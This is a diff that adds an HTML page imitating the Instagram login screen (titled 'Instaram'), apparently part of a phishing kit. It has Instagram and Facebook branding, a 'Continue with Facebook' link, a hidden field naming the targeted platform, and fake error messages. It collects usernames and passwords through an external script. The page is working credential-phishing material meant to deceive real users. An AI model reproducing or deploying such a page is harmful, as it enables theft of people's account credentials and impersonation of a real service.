@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel='icon' href='/static/other/instagram-fav-icon.png' type='image/png' />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="/static/other/font-awesome-4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/instagram.css">
+    <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+    <link rel="prerender" href="/success">
+    <title>Instaram</title>
+</head>
+
+<body>
+    <nav class="top ">
+        <div class="dots ">...</div>
+        <div class="language center allcaps">
+            english
+            <span class="arrow">
+                <i class="fa fa-angle-down" aria-hidden="true"></i>
+            </span>
+        </div>
+    </nav>
+
+    <main>
+        <div class="instagramTextImg">
+            <img src="/static/other/insta_text.png" alt="">
+        </div>
+
+        <a href="/facebook" style="color: inherit;text-decoration:none">
+            <div class="btn continueWithFacebook whiteTxt backBlue">
+                <i class="fa fa-facebook-square" aria-hidden="true"></i> Continue with Facebook
+            </div>
+        </a>
+
+        <div class="orline">
+            <div class='line'>
+            </div>
+            <span class="orWord allcaps ">or</span>
+            <div class='line'>
+            </div>
+        </div>
+    </main>
+
+    <div class="form">
+        <form id='form' class="form">
+            <input id="id" type="hidden" name='id'>
+            <input id="plateform" type="hidden" name='plateform' value="instagram">
+            <div class="form input username">
+                <input type="text" autocapitalize="off" autocorrect="off" name="username" oninput="check()" id="username" required>
+                <label for='username'>Phone number, username, or email</label>
+            </div>
+            <div class="form input password">
+                <input type="text" autocapitalize="off" autocorrect="off" name="password" oninput="check()" id="password" required>
+                <label for='password'>Password</label >
+            </div>
+            <div class="form forgot fadedBlue">
+                <span>Forgot password?</span>
+            </div>
+            <div id='submit' class="form submit">
+                <input class='btn2' type="submit" id="sub" value="Log In">
+            </div>
+            <div id="error" class="error">
+                <p id="usernameError" class="usernameError">
+                    The username you entered doesn't belong to an account. Please check your username and try again.
+                </p>
+                <p id="passwordError" class="passwordError">
+                    The password you entered is incorrect. Please try again.
+                </p>
+               
+            </div>
+            <div class="form center lastText fadedBlack">
+                Don't have an account? <span class="fadedBlue">Sign up</span>
+            </div>
+        </form>
+    </div>
+
+    <footer class="footer">
+        <div class="from center">from</div>
+        <div class="allcaps center">facebook</div>
+
+    </footer>
+
+</body>
+<script src="/static/js/instagram.js"></script>
+
+
+
+</html>
